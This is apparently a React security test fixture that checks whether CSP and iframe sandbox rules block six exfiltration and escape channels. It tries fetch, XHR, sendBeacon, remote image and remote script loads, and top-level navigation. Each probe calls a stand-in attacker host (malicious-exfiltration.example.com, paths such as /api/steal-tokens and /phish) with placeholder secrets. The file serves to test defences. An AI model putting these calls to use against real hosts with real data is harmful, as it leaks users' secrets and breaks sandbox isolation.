import React, { useState, useEffect } from 'react';

/**
 * Security Fixture: Multi-Vector Network Exfiltration & Navigation Probe
 *
 * Exercises 6 distinct exfiltration and escape mechanisms to prove the
 * browser CSP and sandbox attribute boundaries are strictly enforced:
 * 1. fetch() - connect-src 'none'
 * 2. XMLHttpRequest - connect-src 'none'
 * 3. navigator.sendBeacon - connect-src 'none' (verified via SecurityPolicyViolationEvent)
 * 4. Remote Image load (new Image().src) - img-src 'self' data:
 * 5. Remote Script Injection (createElement('script')) - script-src 'unsafe-inline' 'unsafe-eval'
 * 6. Top-level Navigation (window.top.location or anchor _top) - sandbox without allow-top-navigation
 */
export default function SecurityNetworkExfiltrationFixture() {
  const [probeResults, setProbeResults] = useState<{
    fetchBlocked: boolean | null;
    xhrBlocked: boolean | null;
    beaconBlocked: boolean | null;
    imageBlocked: boolean | null;
    scriptBlocked: boolean | null;
    topNavBlocked: boolean | null;
  }>({
    fetchBlocked: null,
    xhrBlocked: null,
    beaconBlocked: null,
    imageBlocked: null,
    scriptBlocked: null,
    topNavBlocked: null
  });

  useEffect(() => {
    // Listen for browser-native CSP violation events
    const handleViolation = (e: any) => {
      const uri = (e.blockedURI || '').toLowerCase();
      const dir = (e.violatedDirective || '').toLowerCase();

      if (uri.includes('beacon-leak') || dir.includes('connect-src')) {
        setProbeResults((p) => ({ ...p, beaconBlocked: true }));
      }
      if (uri.includes('tracker.png') || dir.includes('img-src')) {
        setProbeResults((p) => ({ ...p, imageBlocked: true }));
      }
      if (uri.includes('remote-script') || dir.includes('script-src')) {
        setProbeResults((p) => ({ ...p, scriptBlocked: true }));
      }
    };

    document.addEventListener('securitypolicyviolation', handleViolation);

    // 1. Probe fetch()
    fetch('https://malicious-exfiltration.example.com/api/steal-tokens', {
      method: 'POST',
      body: JSON.stringify({ leaked: 'secret-token' })
    })
      .then(() => setProbeResults((p) => ({ ...p, fetchBlocked: false })))
      .catch(() => setProbeResults((p) => ({ ...p, fetchBlocked: true })));

    // 2. Probe XMLHttpRequest
    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://malicious-exfiltration.example.com/xhr-leak');
      xhr.onerror = () => setProbeResults((p) => ({ ...p, xhrBlocked: true }));
      xhr.onload = () => setProbeResults((p) => ({ ...p, xhrBlocked: false }));
      xhr.send('data=secret');
    } catch (_) {
      setProbeResults((p) => ({ ...p, xhrBlocked: true }));
    }

    // 3. Probe navigator.sendBeacon
    try {
      if (typeof navigator.sendBeacon === 'function') {
        const sent = navigator.sendBeacon(
          'https://malicious-exfiltration.example.com/beacon-leak',
          'beacon=secret'
        );
        if (!sent) {
          setProbeResults((p) => ({ ...p, beaconBlocked: true }));
        }
      } else {
        setProbeResults((p) => ({ ...p, beaconBlocked: true }));
      }
    } catch (_) {
      setProbeResults((p) => ({ ...p, beaconBlocked: true }));
    }

    // 4. Probe Remote Image Loading (new Image().src)
    try {
      const img = new Image();
      img.onload = () => setProbeResults((p) => ({ ...p, imageBlocked: false }));
      img.onerror = () => setProbeResults((p) => ({ ...p, imageBlocked: true }));
      img.src = 'https://malicious-exfiltration.example.com/tracker.png?secret=123';
    } catch (_) {
      setProbeResults((p) => ({ ...p, imageBlocked: true }));
    }

    // 5. Probe Remote Script Injection
    try {
      const script = document.createElement('script');
      script.onload = () => setProbeResults((p) => ({ ...p, scriptBlocked: false }));
      script.onerror = () => setProbeResults((p) => ({ ...p, scriptBlocked: true }));
      script.src = 'https://malicious-exfiltration.example.com/remote-script.js';
      document.head.appendChild(script);
    } catch (_) {
      setProbeResults((p) => ({ ...p, scriptBlocked: true }));
    }

    // 6. Probe Top-level Navigation (window.top.location mutation)
    try {
      const canMutate = () => {
        try {
          if (window.top && window.top !== window) {
            window.top.location.href = 'https://malicious-exfiltration.example.com/phish';
            return false;
          }
        } catch (err) {
          return true;
        }
        return true;
      };
      setProbeResults((p) => ({ ...p, topNavBlocked: canMutate() }));
    } catch (_) {
      setProbeResults((p) => ({ ...p, topNavBlocked: true }));
    }

    return () => {
      document.removeEventListener('securitypolicyviolation', handleViolation);
    };
  }, []);

  const allResolved =
    probeResults.fetchBlocked !== null &&
    probeResults.xhrBlocked !== null &&
    probeResults.beaconBlocked !== null &&
    probeResults.imageBlocked !== null &&
    probeResults.scriptBlocked !== null &&
    probeResults.topNavBlocked !== null;

  const allBlocked =
    probeResults.fetchBlocked === true &&
    probeResults.xhrBlocked === true &&
    probeResults.beaconBlocked === true &&
    probeResults.imageBlocked === true &&
    probeResults.scriptBlocked === true &&
    probeResults.topNavBlocked === true;

  return (
    <div className="p-6 max-w-lg mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
      <h2 className="text-lg font-bold text-gray-900" data-testid="network-security-title">
        Multi-Vector Network & Navigation Exfiltration Probe
      </h2>
      <p className="text-xs text-gray-600">
        Verifies CSP (
        <code className="bg-gray-100 px-1 py-0.5 rounded font-mono text-xs">
          connect-src &apos;none&apos;
        </code>
        ,{' '}
        <code className="bg-gray-100 px-1 py-0.5 rounded font-mono text-xs">
          img-src &apos;self&apos; data:
        </code>
        ,{' '}
        <code className="bg-gray-100 px-1 py-0.5 rounded font-mono text-xs">
          script-src &apos;unsafe-inline&apos;
        </code>
        ) and sandbox navigation restrictions.
      </p>

      <div className="space-y-2 text-xs font-mono">
        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
          <span>1. Outbound fetch() API:</span>
          <span
            data-testid="probe-fetch-status"
            className={
              probeResults.fetchBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'
            }
          >
            {probeResults.fetchBlocked === null
              ? 'PROBING...'
              : probeResults.fetchBlocked
                ? 'BLOCKED'
                : 'BREACHED'}
          </span>
        </div>

        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
          <span>2. XMLHttpRequest (XHR):</span>
          <span
            data-testid="probe-xhr-status"
            className={
              probeResults.xhrBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'
            }
          >
            {probeResults.xhrBlocked === null
              ? 'PROBING...'
              : probeResults.xhrBlocked
                ? 'BLOCKED'
                : 'BREACHED'}
          </span>
        </div>

        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
          <span>3. navigator.sendBeacon:</span>
          <span
            data-testid="probe-beacon-status"
            className={
              probeResults.beaconBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'
            }
          >
            {probeResults.beaconBlocked === null
              ? 'PROBING...'
              : probeResults.beaconBlocked
                ? 'BLOCKED'
                : 'BREACHED'}
          </span>
        </div>

        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
          <span>4. Remote Image (&lt;img src&gt;):</span>
          <span
            data-testid="probe-image-status"
            className={
              probeResults.imageBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'
            }
          >
            {probeResults.imageBlocked === null
              ? 'PROBING...'
              : probeResults.imageBlocked
                ? 'BLOCKED'
                : 'BREACHED'}
          </span>
        </div>

        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
          <span>5. Remote Script Injection:</span>
          <span
            data-testid="probe-script-status"
            className={
              probeResults.scriptBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'
            }
          >
            {probeResults.scriptBlocked === null
              ? 'PROBING...'
              : probeResults.scriptBlocked
                ? 'BLOCKED'
                : 'BREACHED'}
          </span>
        </div>

        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
          <span>6. Top-Level Navigation:</span>
          <span
            data-testid="probe-topnav-status"
            className={
              probeResults.topNavBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'
            }
          >
            {probeResults.topNavBlocked === null
              ? 'PROBING...'
              : probeResults.topNavBlocked
                ? 'BLOCKED'
                : 'BREACHED'}
          </span>
        </div>
      </div>

      <div className="pt-2 border-t border-gray-200 flex items-center justify-between">
        <span className="text-xs font-semibold text-gray-700">
          Composite Exfiltration Boundary:
        </span>
        <span
          data-testid="network-isolation-status"
          className={`px-2.5 py-1 rounded text-xs font-mono font-bold ${
            allResolved && allBlocked
              ? 'bg-green-100 text-green-800'
              : 'bg-yellow-100 text-yellow-800'
          }`}
        >
          {!allResolved
            ? 'TESTING...'
            : allBlocked
              ? 'ALL_EXFILTRATION_BLOCKED'
              : 'VULNERABILITY_DETECTED'}
        </span>
      </div>
    </div>
  );
}
